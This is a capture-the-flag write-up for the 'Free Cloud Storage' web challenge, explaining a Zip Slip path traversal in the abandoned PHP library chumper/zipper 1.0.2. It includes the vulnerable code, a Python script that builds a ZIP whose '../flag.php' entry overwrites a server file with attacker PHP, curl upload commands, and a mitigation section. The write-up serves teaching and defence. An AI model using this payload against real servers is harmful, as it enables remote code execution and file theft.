# Free Cloud Storage

| Field        | Value                        |
| ------------ | ---------------------------- |
| **Category** | Web                          |
| **Flag**     | `tjctf{i_l0v3_fr33_st0r4g3}` |

## Description

> Free cloud storage, what could possibly go wrong?

A simple web application that lets you upload a ZIP archive and extracts it on
the server.  Behind the scenes it uses the PHP library `chumper/zipper` version
**1.0.2** which is **abandoned** and contains a known **Zip Slip** (path
traversal) vulnerability.

---

## Source Code Analysis

The application consists of four files:

```
composer.json      —  dependency manifest (chumper/zipper 1.0.2)
flag.php           —  decoy (just prints "Nice try, but there's no flag here!")
index.html         —  upload form
upload.php         —  the core logic
```

### `composer.json`

```json
{
  "name": "free-cloud-storage/zip-upload",
  "require": {
    "chumper/zipper": "1.0.2"
  }
}
```

The pinned version `1.0.2` is the last release **before** the Zip Slip
fix — the security patch landed in `1.0.3`.

### `flag.php`

```php
<?php
die("Nice try, but there's no flag here!");
?>
```

A deliberate decoy to mislead players who try to read `flag.php` directly.

### `upload.php` (the vulnerable code)

```php
<?php
require 'vendor/autoload.php';
use Chumper\Zipper\Zipper;

$uploadDir = __DIR__ . '/uploads/';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ... basic extension check ...
    $destination = $uploadDir . $fileName;

    if (!move_uploaded_file($tmpName, $destination)) {
        die("Upload failed.");
    }

    $zipper = new Zipper();
    $zipper->make($destination)->extractTo($uploadDir);
}
?>
```

Key observations:

1.  The uploaded ZIP is moved into `__DIR__ . '/uploads/'`.
2.  `$zipper->make($destination)->extractTo($uploadDir)` extracts **every**
    entry in the archive into that same directory.
3.  There is **no sanitisation** of ZIP entry paths — the library trusts
    whatever path the archive provides.

---

## Vulnerability — Zip Slip

Zip Slip is a classic archive extraction vulnerability.  When a ZIP entry
contains path-traversal characters such as `../`, a naive extraction routine
will happily write the file **outside** the intended directory.

In `chumper/zipper` v1.0.2 the extraction logic in
`extractOneFileInternal` looks like this (simplified):

```php
private function extractOneFileInternal($fileName, $path)
{
    $tmpPath = str_replace($this->getInternalPath(), '', $fileName);
    // NO check for '../' — that was added in v1.0.3

    $dir = pathinfo($path . DIRECTORY_SEPARATOR . $tmpPath, PATHINFO_DIRNAME);
    // ...
    $toPath = $path . DIRECTORY_SEPARATOR . $tmpPath;
    file_put_contents($toPath, $contents);
}
```

If we create a ZIP archive whose entry is named `../flag.php`, then:

- `$path`  = `/var/www/html/uploads/`
- `$tmpPath` = `../flag.php`
- **`$toPath`** = `/var/www/html/uploads/../flag.php`
    → **`/var/www/html/flag.php`**

The original `flag.php` gets **overwritten** with our payload.

---

## Exploitation

### Step 1 — Craft a malicious ZIP

Using Python's `zipfile` module, we create a ZIP where the entry name
contains the path traversal:

```python
import zipfile

payload = b'''<?php
echo file_get_contents("/var/www/html/flag.txt");
?>'''

with zipfile.ZipFile("pwn.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("../flag.php", payload)
```

The resulting archive has a single entry whose path is `../flag.php`.

### Step 2 — Upload the ZIP

Send a `multipart/form-data` POST request to `/upload.php`:

```bash
curl -F "zipfile=@pwn.zip" https://target.tjc.tf/upload.php
```

The server accepts it (the extension check passes — it's still a `.zip`),
moves it to `/var/www/html/uploads/pwn.zip`, and then extracts it.

### Step 3 — Read the flag

Visit `/flag.php`:

```bash
curl https://target.tjc.tf/flag.php
```

Our payload executes and returns:

```
tjctf{i_l0v3_fr33_st0r4g3}
```

---

## Full Exploit Script

```python
#!/usr/bin/env python3
"""
Solution script for "Free Cloud Storage" — tjCTF 2026
"""
import argparse
import io
import sys
import zipfile

import requests

PAYLOAD = """\
<?php
echo file_get_contents("/var/www/html/flag.txt");
"""

TRAVERSAL_PATH = "../flag.php"


def build_zip(payload: str, entry_name: str = TRAVERSAL_PATH) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(entry_name, payload)
    return buf.getvalue()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("base_url")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    # 1. Upload the malicious ZIP
    zip_data = build_zip(PAYLOAD)
    r = requests.post(
        f"{base}/upload.php",
        files={"zipfile": ("pwn.zip", zip_data, "application/zip")},
    )
    assert r.status_code == 200, "Upload failed"

    # 2. Fetch flag
    r = requests.get(f"{base}/flag.php")
    print(f"Flag: {r.text.strip()}")


if __name__ == "__main__":
    main()
```

---

## Mitigation

The fix (implemented in `chumper/zipper` v1.0.3) is straightforward — reject
any entry name containing `../` or `..\\`:

```php
if (strpos($fileName, '../') !== false || strpos($fileName, '..\\') !== false) {
    throw new \RuntimeException('Special characters found within filenames');
}
```

In general, always:
- Keep dependencies up to date.
- If a library is archived/abandoned, replace it with a maintained
  alternative.
- Sanitise or canonicalise paths extracted from archives — resist Zip Slip
  at the application level even if the library claims to be safe.
